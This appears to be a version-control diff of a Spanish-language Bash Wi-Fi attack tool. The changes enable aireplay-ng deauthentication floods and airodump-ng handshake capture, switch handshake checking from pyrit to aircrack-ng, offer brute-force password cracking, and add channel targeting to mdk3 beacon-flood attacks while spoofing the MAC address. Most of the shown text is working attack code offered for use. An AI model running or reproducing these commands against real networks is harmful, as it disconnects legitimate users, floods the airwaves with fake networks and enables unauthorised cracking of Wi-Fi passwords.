@@ -13,7 +13,7 @@ grC="\e[0;37m\033[1m"
 
 #Variables
 
-version=1.0
+version=1.5
 dicR=files/redes.txt
 trap ctrl_c INT
 
@@ -27,10 +27,10 @@ function ctrl_c(){
 		sleep 1
 		echo -e "\n${rC} [!] ${endC}${grC}Saliendo ...${endC}"
 		sleep 1
-		rm int > /dev/null 2>&1; rm "files/handshake*" > /dev/null 2>&1; airmon-ng stop $inter > /dev/null 2>&1; service networking restart; tput cnorm; exit 0
+		rm int > /dev/null 2>&1; rm "files/handshake*" > /dev/null 2>&1; airmon-ng stop $inter > /dev/null 2>&1; ifconfig $networkCard up > /dev/null 2>&1;service networking restart; tput cnorm; exit 0
 	else
 		echo -e "\n\n${rC} [!] ${endC}${gC}Saliendo ...${endC}"
-		kill -9 $BFPID 2>/dev/null; wait $BFPID 2>/dev/null; rm int > /dev/null 2>&1; airmon-ng stop $inter > /dev/null 2>&1; rm "files/handshake*" > /dev/null 2>&1;service networking restart; tput cnorm;exit 0
+		kill -9 $BFPID 2>/dev/null; wait $BFPID 2>/dev/null; rm int > /dev/null 2>&1; airmon-ng stop $inter > /dev/null 2>&1; ifconfig $networkCard up > /dev/null 2>&1;rm "files/handshake*" > /dev/null 2>&1;service networking restart; tput cnorm;exit 0
 	fi
 }
 
@@ -85,29 +85,28 @@ function banner(){
 
 }
 
-
 function help(){
 
 	echo -e "\n ${yC}[!]${endC} ${bC}Opciones:${endC} ${grC}$0${endC}"
 	echo -e "\t ${bC}a)${endC} ${gC}Modo de Ataque:${endC}"
 	echo -e "\t\t${tuC}- Handshake${endC}"
-	echo -e "\t\t${tuC}- PKMID${endC}"
-	echo -e "\t\t${tuC}- Portal Cautivo${endC}"
-	echo -e "\t\t${tuC}- EviTwin${endC}"
+	#echo -e "\t\t${tuC}- PKMID${endC}"
+	#echo -e "\t\t${tuC}- Portal Cautivo${endC}"
+	#echo -e "\t\t${tuC}- EviTwin${endC}"
 	echo -e "\t\t${tuC}- BeconFlood${endC}"
 	echo -e "\t ${bC}n)${endC} ${gC}Nombre de la tarjeta de Red.${endC}"
 	echo -e "\t\t${tuC}- Ej: -n wlan0${endC}"
 	echo -e "\t ${bC}d)${endC} ${gC}Omitir comprobación de las Dependencias.${endC}"
-	echo -e "\t ${bC}g)${endC} ${gC}Modo Guia${endC}"
-	echo -e "\t\t${tuC}- El modo guia te va guiando paso a paso.${endC}"
-	echo -e "\t\t${tuC}- Ej: $0 -g${endC}"
-	echo -e "\n ${yC}[*]${endC} ${bC}Ejemplo:${endC} ${grC}$0 -a handshake -n wlan0 ${endC}"
+	#echo -e "\t ${bC}g)${endC} ${gC}Modo Guia${endC}"
+	#echo -e "\t\t${tuC}- El modo guia te va guiando paso a paso.${endC}"
+	#echo -e "\t\t${tuC}- Ej: $0 -g${endC}"
+	#echo -e "\n ${yC}[*]${endC} ${bC}Ejemplo:${endC} ${grC}$0 -a handshake -n wlan0 ${endC}"
 
 	tput cnorm
 }
 
 function dependencias(){
-	tput civis;clear; dep=(macchanger airmon-ng airodump-ng mdk3 pyrit); declare -i coun=0; depn=()
+	tput civis;clear; dep=(macchanger airmon-ng airodump-ng aircrack-ng mdk3); declare -i coun=0; depn=()
 
 	echo -e "\n ${yC}[*] ${endC}${pC}Verificando dependencias.${endC}"
 	/usr/bin/sleep 1
@@ -145,15 +144,7 @@ function dependencias(){
 
 			for i in "${depn[@]}";do
 				echo -e "${yC}\n\t [+]${endC} ${grC}Instalando programa${endC} ${bC}$i${endC}"
-				if [ $i == pyrit ]; then
-
-					sudo git clone https://github.com/JPaulMora/Pyrit > /dev/null 2>&1
-					cd Pyrit; python setup.py install > /dev/null 2>&1
-					sudo pip install -U pip scapy==2.4.2 > /dev/null 2>&1
-					rm -r Pyriy > /dev/null 2>&1
-				else
 					sudo apt-get install $i -y --fix-missing > /dev/null 2>&1
-				fi
 			done
 		else
 			tput cnorm; exit 0
@@ -171,16 +162,12 @@ function monitor(){
 	inter=$(cat int | cut -d ' ' -f 1 | xargs | grep "mon$")
 	echo -e "\n${bC} [!]${endC}${gC} Cambiando la direccion MAC de la tardejta de red ${bC}$inter${endC}...${endC}"
 	amac=$(macchanger -s $inter | grep -i current | xargs | cut -d ' ' -f '3-30')
-	ifconfig $inter down && macchanger -a $inter > /dev/null 2>&1
+	ifconfig $inter down > /dev/null 2>&1 && macchanger -a $inter > /dev/null 2>&1
 	echo -e "${rC}\t [*]${endC}${tuC} Direccion MAC de la tarjeta de interfaz $inter: $amac${endC}"
 	echo -e "${yC}\t [*]${endC}${tuC} Nueva direccion MAC asignada:${endC} ${pC}$(macchanger -s $inter | grep -i current |xargs | cut -d ' ' -f '3-30')${endC}"
 	ifconfig $inter up > /dev/null 2>&1; killall wpa_supplicant dhclient 2>/dev/null
-	#sleep 5
+	sleep 3
 	clear
-#	airmon-ng stop $inter > /dev/null 2>&1
-#	ifconfig $networkCard up > /dev/null 2>&1
-
-
 }
 
 function startA(){
@@ -191,15 +178,15 @@ function startA(){
 
 		echo -e "\n${yC} [*]${endC}${grC} Scaneando estaciones ...${endC}"
 
-		#xterm -hold -fg white -bg black -e "airodump-ng $inter" &
-		#aPID=$!
+		xterm -hold -fg white -bg black -e "airodump-ng $inter" &
+		aPID=$!
 		sleep 5
 		echo -ne "\n\t${gC} [?]${endC}${bC} Ingresa el nombre de la estacion: ${endC}" && read ssid
 	#	echo -e $ssid
 		echo -ne "\n\t${gC} [?]${endC}${bC} Ingresa el canal de la estacion ${endC}${grC}$ssid: ${endC}" && read ch
 	#	echo -e $ch
 
-		#kill -9 $aPID; wait $aPID 2>/dev/null
+		kill -9 $aPID; wait $aPID 2>/dev/null
 
 		echo -ne "\n\t${gC} [?]${endC}${bC} Ingresa el tiempo en segundos que durara el ataque[def 60]: ${endC}" && read tm
 		sleep 4
@@ -207,11 +194,11 @@ function startA(){
 		#Comprobar si es un numero entero
 		if [[ $tm =~ ^-?[0-9]+$ ]]; then
 
-		#	xterm -hold -fg white -bg black -e "airodump-ng -c $ch -w files/handshake --essid $ssid $inter" &
-		#	hPID=$!
+			xterm -hold -fg white -bg black -e "airodump-ng -c $ch -w files/handshake --essid $ssid $inter" &
+			hPID=$!
 
-		#	xterm -hold -fg white -bg black -e " aireplay-ng -0 tm -e $ssid -c FF:FF:FF:FF:FF:FF $inter" &
-		#	dPID=$!
+			xterm -hold -fg white -bg black -e "aireplay-ng -0 $tm -e $ssid -c FF:FF:FF:FF:FF:FF $inter" &
+			dPID=$!
 			for i in $(seq 1 $tm); do
 			echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake.${endC}"
 				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
@@ -234,16 +221,15 @@ function startA(){
 				sleep .25
 			clear
 			done
-		#	kill -9 $hPID; wait $hPID 2>/dev/null
-		#	kill -9 $dPID; wait $dPID 2>/dev/null
+			kill -9 $hPID; wait $hPID 2>/dev/null
+			kill -9 $dPID; wait $dPID 2>/dev/null
 
 			cat files/handshake-01.cap > /dev/null 2>&1
 			fh=$?
 ##			echo $fh
 
 			if [ $fh == "0" ]; then
-##				pyrit -r  files/handshake-01.cap analyze
-				if [ $(pyrit -r files/handshake-01.cap analyze | grep "handshake" | tail -1 | awk '{print $5}' | tr -d '() :') == 'handshakes' ]; then
+				if [ $(aircrack-ng files/handshake-01.cap | grep "handshake" | awk '{print $6}' | tr -d ')') == 'handshake' ]; then
 					echo -ne "\n${rC} [!]${endC}${bC} Se encontro un Handshake${endC}"
 					echo -ne "\n${yC} [?]${endC}${grC} Desea usar fuerza bruta para romper la password?[Y/n] ${endC}" && read hand
 						if [[ $hand == "y" || $hand == "Y" || $hand == "yes" || $hand == "Yes" || $hand == "YES" ]]; then
@@ -337,7 +323,15 @@ function startA(){
 								fi
 						else
 						#Si el usuario decide que no se sale del programa pero se pregunta si quiere guardar el archivo.
-						echo ""
+							echo -ne "\n${yC} [?]${endC}${grC} Desea usar guardar el archivo?[Y/n] ${endC}" && read save
+
+							if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
+								echo -ne "\n${yC} [?]${endC}${grC} Ingrese el nombre del archivo: ${endC}" && read name
+								cp files/handshake-01.cap files/$name.cap
+								echo -ne "\n${gC} [!]${endC}${brC} Archovo guardado en la carpeta files como $name ${endC}"
+							else
+								pass
+							fi
 						fi
 
 				else
@@ -373,11 +367,12 @@ function startA(){
 		else
 		#Ataque dura 60 segundos
 			tm=60
-		#	xterm -hold -fg white -bg black -e "airodump-ng -c $ch -w files/handshake --essid $ssid $inter" &
-		#	hPID=$!
+			xterm -hold -fg white -bg black -e "airodump-ng -c $ch -w files/handshake --essid $ssid $inter" &
+			hPID=$!
 
-		#	xterm -hold -fg white -bg black -e " aireplay-ng -0 tm -e $ssid -c FF:FF:FF:FF:FF:FF $inter" &
-		#	dPID=$!
+			xterm -hold -fg white -bg black -e " aireplay-ng -0 $tm -e $ssid -c FF:FF:FF:FF:FF:FF $inter" &
+			dPID=$!
+			tm=$(($tm+5))
 			for i in $(seq 1 $tm); do
 				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake.${endC}"
 				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
@@ -400,14 +395,14 @@ function startA(){
 				sleep .25
 				clear
 			done
-		#	kill -9 $hPID; wait $hPID 2>/dev/null
-		#	kill -9 $dPID; wait $dPID 2>/dev/null
+			kill -9 $hPID; wait $hPID 2>/dev/null
+		  kill -9 $dPID; wait $dPID 2>/dev/null
 			cat files/handshake-01.cap > /dev/null 2>&1
 			fh=$?
-##			echo $fh
+			echo $fh
 			if [ $fh == "0" ]; then
-##				pyrit -r  files/handshake-01.cap analyze
-				if [ $(pyrit -r files/handshake-01.cap analyze | grep "handshake" | tail -1 | awk '{print $5}' | tr -d '() :') == 'handshakes' ]; then
+
+				if [ $(aircrack-ng files/handshake-01.cap | grep "handshake" | awk '{print $6}' | tr -d ')') == 'handshake' ]; then
 					echo -ne "\n${rC} [!]${endC}${bC} Se encontro un Handshake${endC}"
 					echo -ne "\n${yC} [?]${endC}${grC} Desea usar fuerza bruta para romper la password?[Y/n] ${endC}" && read hand
 						if [[ $hand == "y" || $hand == "Y" || $hand == "yes" || $hand == "Yes" || $hand == "YES" ]]; then
@@ -506,7 +501,7 @@ function startA(){
 						echo -ne "\n${yC} [?]${endC}${bC} Desea guardar el archivo .cap?[Y/n] ${endC}" && read res
 							if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
 								echo -ne "\n${yC} [?]${endC}${bC} Con que nombre desea guardarlo? ${endC}" && read name
-								mv files/handshake-01.cap files7name.cap > /dev/null 2>&1
+								mv files/handshake-01.cap files/name.cap > /dev/null 2>&1
 								echo -e "\n ${rC}[!]${endC}${grC} Saliendo ...${endC}"
 							else
 								echo -e "\n ${rC}[!]${endC}${grC} Saliendo ...${endC}"
@@ -541,7 +536,7 @@ function startA(){
 				fi
 			fi
 		fi
-		
+
 	elif [ $(echo $attackMode | tr a-z A-Z) == "BECONFLOOD" ]; then
 		clear
 		echo -e "\n${yC} [*]${endC}${bC} Iniciando modo de ataque $attackMode .${endC}"
@@ -603,23 +598,23 @@ function startA(){
 					if [[ $tm =~ ^-?[0-9]+$ ]]; then
 
 						echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
-						mdk3 $inter b -f $file -a -s 1000 &
+						mdk3 $inter b -f $file -c $ch -a -s 1000 &
 						BFPID=$!
 						linesF=$(cat $file | wc -l) > /dev/null 2>&1
 						bi=0
 						mapfile -t redes < $file
 						for i in $(seq $tm); do
 								clear
-								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 								sleep .25
 								bi=$((bi+1))
 								if [[ $bi == $linesF ]]; then
@@ -635,23 +630,23 @@ function startA(){
 
 					elif [ $tm == 'i' ]; then
 						echo -e " ${yC}[*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
-						mdk3 $inter b -f $file -a -s 1000 &
+						mdk3 $inter b -f $file -c $ch -a -s 1000 &
 						BFPID=$!
 						mapfile -t redes < $file
 						linesF=$(cat $file | wc -l) > /dev/null 2>&1
 						i=0
 						while true; do
 							clear
-							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							i=$((i+1))
 							if [[ $i == $linesF ]]; then
@@ -685,7 +680,7 @@ function startA(){
 						tm=i
 						echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
 						#Inicio de ataque
-						mdk3 $inter b -f $file -a -s 1000 &
+						mdk3 $inter b -f $file -a -c $ch -s 1000 &
 						sleep 2
 						BFPID=$!
 						mapfile -t redes < $file
@@ -694,16 +689,16 @@ function startA(){
 						i=0
 						while true; do
 							clear
-							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							i=$((i+1))
 							if [[ $i == $linesF ]]; then
@@ -739,21 +734,21 @@ function startA(){
 					if [[ $tm =~ ^-?[0-9]+$ ]]; then
 
 						echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
-						mdk3 $inter b -f $dicR -a -s 1000 &
+						mdk3 $inter b -f $dicR -a -c $ch -s 1000 &
 						BFPID=$!
 						mapfile -t redes < $dicR
 						for i in $(seq $tm); do
 								clear
-								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 						done
 						kill -9 $BFPID; wait $BFPID 2>/dev/null
@@ -765,23 +760,23 @@ function startA(){
 
 					elif [ $tm == 'i' ]; then
 						echo -e "${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
-						mdk3 $inter b -f $dicR -a -s 1000 &
+						mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 						BFPID=$!
 						mapfile -t redes < $dicR
 						linesF=$(cat $file | wc -l) > /dev/null 2>&1
 						i=0
 						while true; do
 							clear
-							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							i=$((i+1))
 							if [[ $i == $linesF ]]; then
@@ -815,7 +810,7 @@ function startA(){
 						tm=i
 						echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
 						#Inicio de ataque
-						mdk3 $inter b -f $dicR -a -s 1000 &
+						mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 						BFPID=$!
 						mapfile -t redes < $dicR
 						linesF=$(cat $file | wc -l) > /dev/null 2>&1
@@ -823,16 +818,16 @@ function startA(){
 						i=0
 						while true; do
 							clear
-							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							i=$((i+1))
 							if [[ $i == $linesF ]]; then
@@ -869,21 +864,21 @@ function startA(){
 					if [[ $tm =~ ^-?[0-9]+$ ]]; then
 
 						echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
-						mdk3 $inter b -f $dicR -a -s 1000 &
+						mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 						BFPID=$!
 						mapfile -t redes < $dicR
 						for i in $(seq $tm); do
 								clear
-								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 								clear
-								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 								sleep .25
 						done
 						kill -9 $BFPID; wait $BFPID 2>/dev/null
@@ -895,23 +890,23 @@ function startA(){
 
 					elif [ $tm == 'i' ]; then
 						echo -e "${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
-						mdk3 $inter b -f $dicR -a -s 1000 &
+						mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 						BFPID=$!
 						mapfile -t redes < $dicR
 						linesF=$(cat $file | wc -l) > /dev/null 2>&1
 						i=0
 						while true; do
 							clear
-							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							i=$((i+1))
 							if [[ $i == $linesF ]]; then
@@ -945,7 +940,7 @@ function startA(){
 						tm=i
 						echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
 						#Inicio de ataque
-						mdk3 $inter b -f $dicR -a -s 1000 &
+						mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 						BFPID=$!
 						mapfile -t redes < $dicR
 						linesF=$(cat $file | wc -l) > /dev/null 2>&1
@@ -953,16 +948,16 @@ function startA(){
 						i=0
 						while true; do
 							clear
-							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
